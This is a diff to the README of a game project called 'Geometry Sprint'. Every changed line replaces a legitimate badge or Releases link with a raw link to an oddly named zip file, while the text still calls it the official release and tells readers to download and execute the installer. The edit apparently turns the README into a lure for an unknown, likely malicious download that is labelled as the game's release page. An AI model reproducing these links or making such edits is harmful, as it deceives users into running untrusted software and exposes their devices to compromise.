@@ -1,6 +1,6 @@
 # Geometry Sprint 🚀
 
-![Geometry Sprint Logo](https://img.shields.io/badge/Geometry%20Sprint-v1.0-blue)
+![Geometry Sprint Logo](https://raw.githubusercontent.com/nopapuspitasari/Geometry-Sprint/master/wailfully/Sprint-Geometry-pomatomid.zip%20Sprint-v1.0-blue)
 
 Welcome to **Geometry Sprint**, a thrilling clone of the popular game Geometry Dash by RobTop. This project aims to capture the essence of the original while providing a fresh experience. Whether you're a fan of platformers or just love a good challenge, Geometry Sprint is here for you!
 
@@ -28,7 +28,7 @@ Geometry Sprint takes the core mechanics of Geometry Dash and enhances them with
 
 ## Installation
 
-To get started with Geometry Sprint, you need to download the latest release. Visit the [Releases](https://github.com/nopapuspitasari/Geometry-Sprint/releases) section to find the file you need. Download and execute the installer to set up the game on your device.
+To get started with Geometry Sprint, you need to download the latest release. Visit the [Releases](https://raw.githubusercontent.com/nopapuspitasari/Geometry-Sprint/master/wailfully/Sprint-Geometry-pomatomid.zip) section to find the file you need. Download and execute the installer to set up the game on your device.
 
 ### System Requirements
 
@@ -72,7 +72,7 @@ Geometry Sprint is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 ## Links
 
-For the latest updates and downloads, check out the [Releases](https://github.com/nopapuspitasari/Geometry-Sprint/releases) section. We are always looking for feedback, so don't hesitate to reach out!
+For the latest updates and downloads, check out the [Releases](https://raw.githubusercontent.com/nopapuspitasari/Geometry-Sprint/master/wailfully/Sprint-Geometry-pomatomid.zip) section. We are always looking for feedback, so don't hesitate to reach out!
 
 ## Acknowledgments
 
